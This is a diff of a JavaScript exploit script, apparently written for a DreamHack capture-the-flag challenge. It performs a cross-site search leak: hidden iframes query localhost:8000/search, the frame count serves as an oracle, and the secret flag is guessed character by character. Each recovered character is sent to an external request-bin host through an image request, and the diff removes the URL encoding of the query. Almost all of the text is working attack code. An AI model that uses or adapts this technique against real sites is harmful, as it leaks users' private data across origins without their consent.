@@ -5,17 +5,8 @@ async function req(url) {
         iframe.style.display = "none";
         iframe.src = url;
         iframe.onload = () => {
-            try {
-                // 예: iframe 내 body 텍스트 검사로 결과 유무 판단
-                const bodyText = iframe.contentDocument.body.innerText || "";
-                if (bodyText.includes("Hello World") || bodyText.includes("DreamHack") || bodyText.includes("DH{")) {
-                    resolve();
-                } else {
-                    reject();
-                }
-            } catch(e) {
-                reject();
-            }
+            if (iframe.contentWindow.frames.length != 0) resolve();
+            else reject();
             iframe.remove();
         };
         document.body.appendChild(iframe);
@@ -24,7 +15,7 @@ async function req(url) {
 
 async function search(query) {
     try {
-        await req(`http://localhost:8000/search?query=${encodeURIComponent(query)}`);
+        await req(`http://localhost:8000/search?query=${query}`);
         return true;
     } catch {
         return false;
@@ -39,14 +30,12 @@ async function exploit() {
         for (let c of chars) {
             if (await search(secret + c)) {
                 secret += c;
-                new Image().src = `https://vaibykb.request.dreamhack.games/leak_${secret}`;
-                await new Promise(r => setTimeout(r, 200));  // 0.2초 대기
+                new Image().src = `https://woxypcx.request.dreamhack.games/leak_${c}`;
+                await new Promise(r => setTimeout(r, 100));
                 break;
             }
         }
     }
-    console.log("Flag found:", secret);
 }
-
 exploit();
 </script>
